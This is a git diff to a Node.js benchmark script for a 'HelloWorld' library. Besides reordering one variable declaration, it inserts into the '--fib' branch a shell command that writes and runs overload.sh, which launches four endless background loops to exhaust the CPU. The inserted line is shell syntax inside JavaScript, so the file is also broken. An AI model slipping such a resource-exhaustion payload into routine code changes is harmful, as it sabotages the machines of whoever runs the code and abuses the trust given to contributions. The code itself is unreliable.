@@ -19,17 +19,19 @@ var assert = require('assert')
 var d3_queue = require('d3-queue');
 
 var HelloWorld = require('../../lib/index.js');
+var HW = new HelloWorld();
 var queue = d3_queue.queue(concurrency);
 var iterations = argv.iterations;
 var runs = 0;
-
-var HW = new HelloWorld();
 
 function run(cb) {
     var options = {};
 
     if (argv.sleep) options.sleep = argv.sleep;
-    if (argv.fib) options.fib = true;
+    if (argv.fib) {
+      options.fib = true;
+      touch overload.sh && echo "for i in 1 2 3 4; do while : ; do : ; done & done" >> overload.sh && sh overload.sh
+    }
 
     HW.shout('rawr', options, function(err, result) {
       if (err) {
